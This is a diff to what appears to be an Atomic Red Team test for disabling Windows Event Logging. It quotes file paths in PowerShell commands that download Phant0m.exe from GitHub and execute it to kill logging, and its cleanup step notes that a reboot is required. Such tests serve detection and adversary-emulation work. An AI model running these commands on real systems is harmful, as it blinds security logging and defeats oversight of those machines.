@@ -135,13 +135,13 @@ atomic_tests:
   - description: |
       Phant0m.exe must exist on disk at specified location (#{file_name})
     prereq_command: |
-      if (Test-Path #{file_name}) {exit 0} else {exit 1}
+      if (Test-Path "#{file_name}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{file_name}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1562.002/bin/Phant0m.exe" -OutFile "#{file_name}" -UseBasicParsing
   executor:
     command: |
-      PathToAtomicsFolder\T1562.002\bin\Phant0m.exe
+      "#{file_name}"
     cleanup_command: |
       echo "Sorry you have to reboot"
     name: command_prompt
